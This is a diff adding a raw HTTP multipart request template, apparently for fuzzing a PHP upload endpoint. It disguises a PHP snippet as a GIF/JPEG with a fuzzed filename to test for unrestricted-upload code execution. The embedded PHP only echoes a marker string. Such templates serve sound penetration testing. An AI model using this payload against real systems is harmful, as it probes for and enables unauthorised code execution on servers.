@@ -1,0 +1,13 @@
+POST /upload.php HTTP/1.1
+Host: TARGET_HOST
+User-Agent: Mozilla/5.0
+Accept: */*
+Content-Type: multipart/form-data; boundary=----FUZZBOUNDARY
+
+------FUZZBOUNDARY
+Content-Disposition: form-data; name="uploadFile"; filename="FUZZ"
+Content-Type: image/jpeg
+
+GIF89a
+<?php echo base64_decode("cGhwX2Z1bmNpb25h"); ?>
+------FUZZBOUNDARY--
